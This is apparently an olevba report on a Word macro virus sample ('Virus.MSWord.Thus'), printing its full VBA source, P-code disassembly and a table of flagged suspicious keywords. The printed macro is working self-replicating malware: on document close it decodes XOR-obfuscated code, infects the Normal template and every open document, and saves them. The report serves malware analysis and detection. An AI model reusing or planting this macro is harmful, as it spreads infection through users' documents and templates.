olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.fd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.fd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'Camel
'=9$"#>c$?8>
?"9(.9$"#mpm
,!>(
Dim s, s1, SysInfected
s = ""
If (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0) Or (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel") Then
    s1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1)
    For i = 2 To Len(s1)
     s = s + Chr(Asc(Mid(s1, i, 1)) Xor &H4D)
    Next i
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 11, s
    
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 11
    s = ""
    SysInfected = False
Else
    s1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1)
    For i = 2 To Len(s1)
      s = s + Chr(Asc(Mid(s1, i, 1)) Xor &H4D)
    Next i
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 20, s
    
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 20
    SysInfected = True
End If
Set fs = CreateObject("Scripting.FileSystemObject")
p = Application.Options.DefaultFilePath(wdDocumentsPath) + "\Alc"
If fs.FileExists(p) Then fs.DeleteFile (p)
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines _
       1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   ActiveDocument.VBProject.VBComponents.Item(1).Export (p)
Else
   NormalTemplate.VBProject.VBComponents.Item(1).Export (p)
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (p)
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 5
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close()"
   End If

For i = 1 To Application.Documents.Count
  If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Camel" Then
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule _
   .DeleteLines 1, _
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  End If
  If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
     Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.AddFromFile (p)
     If SysInfected Then
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 5
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Open()"
     Else
      Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
     End If
 End If
  If Not Application.Documents.Item(i).Saved Then Application.Documents.Item(i).Save
Next i
If fs.FileExists(p) Then fs.DeleteFile (p)
Randomize
k = Rnd
If k > 0.5 Then Exit Sub
zz = Array("Èâàíîâ Â.Ì. ß ñëåæó çà òîáîé! (Âîåíêîì)", "Âèòÿ! Õî÷åøü â àðìèþ? À âñå ðàâíî ïîéäåøü!", "Èâàíîâ Â.Ì.! Âàì ïîâåñòêà. Çàéäèòå íà ïî÷òó!")
r = Int((3) * Rnd)
With Assistant.NewBalloon
        .Heading = zz(r)
        .Button = msoButtonSetOK
        .Show
    End With
End Sub














-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.fd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6439 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Camel"
' Line #2:
' 	QuoteRem 0x0000 0x001F "=9$"#>c$?8>
' ?"9(.9$"#mpm
' ,!>("
' Line #3:
' 	Dim 
' 	VarDefn s
' 	VarDefn s1
' 	VarDefn SysInfected
' Line #4:
' 	LitStr 0x0000 ""
' 	St s 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Camel"
' 	Ne 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #6:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s1 
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld s1 
' 	FnLen 
' 	For 
' Line #8:
' 	Ld s 
' 	Ld s1 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitHI2 0x004D 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	LitDI2 0x000B 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #11:
' Line #12:
' 	LitDI2 0x000B 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #13:
' 	LitStr 0x0000 ""
' 	St s 
' Line #14:
' 	LitVarSpecial (False)
' 	St SysInfected 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s1 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld s1 
' 	FnLen 
' 	For 
' Line #18:
' 	Ld s 
' 	Ld s1 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitHI2 0x004D 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St s 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	LitDI2 0x0014 
' 	Ld s 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' Line #22:
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #23:
' 	LitVarSpecial (True)
' 	St SysInfected 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fs 
' Line #26:
' 	Ld wdDocumentsPath 
' 	Ld Application 
' 	MemLd Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0004 "\Alc"
' 	Add 
' 	St p 
' Line #27:
' 	Ld p 
' 	Ld fs 
' 	ArgsMemLd FileExists 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld p 
' 	Paren 
' 	Ld fs 
' 	ArgsMemCall DeleteFile 0x0001 
' 	EndIf 
' Line #28:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Camel"
' 	Ne 
' 	IfBlock 
' Line #29:
' 	LineCont 0x0004 0E 00 07 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #30:
' 	Ld p 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	Ld p 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld p 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #36:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #37:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "'Camel"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	LineCont 0x0008 13 00 03 00 17 00 03 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld p 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #46:
' 	Ld SysInfected 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld p 
' 	Ld fs 
' 	ArgsMemLd FileExists 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld p 
' 	Paren 
' 	Ld fs 
' 	ArgsMemCall DeleteFile 0x0001 
' 	EndIf 
' Line #56:
' 	ArgsCall Read 0x0000 
' Line #57:
' 	Ld Rnd 
' 	St k 
' Line #58:
' 	Ld k 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #59:
' 	LitStr 0x0027 "Èâàíîâ Â.Ì. ß ñëåæó çà òîáîé! (Âîåíêîì)"
' 	LitStr 0x002A "Âèòÿ! Õî÷åøü â àðìèþ? À âñå ðàâíî ïîéäåøü!"
' 	LitStr 0x002C "Èâàíîâ Â.Ì.! Âàì ïîâåñòêà. Çàéäèòå íà ïî÷òó!"
' 	ArgsArray Array 0x0003 
' 	St zz 
' Line #60:
' 	LitDI2 0x0003 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St r 
' Line #61:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #62:
' 	Ld r 
' 	ArgsLd zz 0x0001 
' 	MemStWith Heading 
' Line #63:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #64:
' 	ArgsMemCallWith Show 0x0000 
' Line #65:
' 	EndWith 
' Line #66:
' 	EndSub 
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

